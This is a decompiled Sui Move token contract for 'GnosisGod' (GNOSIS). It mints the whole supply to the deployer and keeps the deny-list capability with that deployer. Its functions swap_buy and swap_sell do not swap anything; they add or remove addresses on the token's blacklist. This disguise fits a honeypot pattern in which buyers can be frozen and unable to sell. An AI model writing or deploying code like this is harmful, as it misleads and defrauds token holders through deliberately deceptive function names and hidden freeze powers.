module 0x2db42adbe8245aac3b39be3a99e41b0cda06b3436f8fd894998bc2d5bfd3b0ad::gnosis {
    struct GNOSIS has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GNOSIS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GNOSIS>(arg0, 9, b"GNOSIS", b"GnosisGod", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQ7PMKuHTfQPF3nKbPaFB6DHtFacNrPduDgqNVo4ycgpx"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GNOSIS>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GNOSIS>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GNOSIS>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GNOSIS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GNOSIS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GNOSIS>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GNOSIS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GNOSIS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

